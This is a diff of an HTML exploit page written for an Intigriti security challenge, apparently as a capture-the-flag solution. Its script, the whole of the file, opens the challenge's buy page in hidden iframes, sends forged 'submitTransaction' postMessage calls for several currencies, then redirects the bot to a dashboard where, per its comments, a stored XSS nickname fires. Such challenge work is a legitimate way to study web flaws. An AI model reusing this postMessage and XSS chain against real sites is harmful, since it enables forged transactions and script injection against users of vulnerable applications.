@@ -1,33 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Exploit</title>
-</head>
 <body>
-    <h1>Processing... Please wait.</h1>
+    <h1>Exploit Running...</h1>
     <script>
-        // Open the vulnerable buy page in a new window/tab
-        const targetUrl = "https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1";
-        const challengeWin = window.open(targetUrl);
+        const currencies = ['1337COIN', 'BTC', 'ETH'];
+        
+        currencies.forEach((curr, index) => {
+            // Create an iframe for each currency to be safe
+            const ifr = document.createElement('iframe');
+            ifr.src = `https://challenge-0126.intigriti.io/buy.html?currency=${curr}&price=0.0001`;
+            ifr.style.display = 'none';
+            document.body.appendChild(ifr);
 
-        // We need to wait for the page and wallets to load
-        setTimeout(() => {
-            console.log("Sending postMessage...");
-            challengeWin.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: 'INTIGRITI-EXPLOIT',
-                    currency: '1337COIN',
-                    amount: 0.0001
-                }
-            }, '*');
-
-            // After the transaction is sent, redirect the bot to the dashboard
-            // where your malicious nickname will be rendered.
             setTimeout(() => {
-                challengeWin.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
-            }, 1500);
-        }, 3000); // 3 seconds to ensure the bot is fully logged in and wallets loaded
+                console.log(`Sending message for ${curr}`);
+                ifr.contentWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: '0x1337',
+                        currency: curr,
+                        amount: 0.00000001
+                    }
+                }, '*');
+            }, 3000 + (index * 500));
+        });
+
+        // After 6 seconds, redirect the main page to the dashboard
+        // This is where the bot will actually see your nickname and trigger the XSS
+        setTimeout(() => {
+            window.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
+        }, 6000);
     </script>
 </body>
 </html>
